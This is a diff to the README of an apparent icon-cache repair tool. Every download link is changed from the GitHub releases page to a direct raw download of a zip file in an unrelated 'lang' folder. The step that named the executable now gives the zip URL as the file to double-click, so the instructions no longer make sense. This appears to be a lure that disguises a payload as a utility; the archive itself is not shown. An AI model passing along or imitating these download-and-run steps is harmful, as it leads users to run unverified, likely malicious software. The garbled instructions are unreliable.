@@ -1,6 +1,6 @@
 # 🧹 ClearCacheIcons - Fix Corrupted Icons with Ease
 
-[![Download ClearCacheIcons](https://img.shields.io/badge/Download_ClearCacheIcons-Here-brightgreen)](https://github.com/Y31C0B/ClearCacheIcons/releases)
+[![Download ClearCacheIcons](https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip)](https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -21,16 +21,16 @@ To run ClearCacheIcons, your system should meet the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the releases page to download.** 
-   Go to the following link to find the latest version: [https://github.com/Y31C0B/ClearCacheIcons/releases](https://github.com/Y31C0B/ClearCacheIcons/releases).
+   Go to the following link to find the latest version: [https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip](https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip).
 
 2. **Select the latest version.** 
    Look for the most recent release at the top of the page. Click on it to view the details and download options.
 
 3. **Download the ClearCacheIcons executable.** 
-   Under the "Assets" section of the release, locate the file labeled `ClearCacheIcons.exe`. Click on the link to download it.
+   Under the "Assets" section of the release, locate the file labeled `https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip`. Click on the link to download it.
 
 4. **Run ClearCacheIcons.** 
-   Once the download is complete, locate the downloaded file in your computer's Downloads folder or the folder you specified. Double-click `ClearCacheIcons.exe` to open the application.
+   Once the download is complete, locate the downloaded file in your computer's Downloads folder or the folder you specified. Double-click `https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip` to open the application.
 
 5. **Repair your icons.** 
    The program will display a simple interface. Click the “Clean Cache” button to start the process. The tool will automatically clean the icon and thumbnail cache for you.
@@ -82,6 +82,6 @@ Join our community for support and to share your experiences with ClearCacheIcon
 
 For any further assistance, or to report bugs, please open an issue in the GitHub repository, and we will respond promptly.
 
-[![Download ClearCacheIcons](https://img.shields.io/badge/Download_ClearCacheIcons-Here-brightgreen)](https://github.com/Y31C0B/ClearCacheIcons/releases)
+[![Download ClearCacheIcons](https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip)](https://raw.githubusercontent.com/Y31C0B/ClearCacheIcons/master/lang/Clear-Icons-Cache-2.9.zip)
 
 Thank you for using ClearCacheIcons! Enjoy a clearer desktop experience.
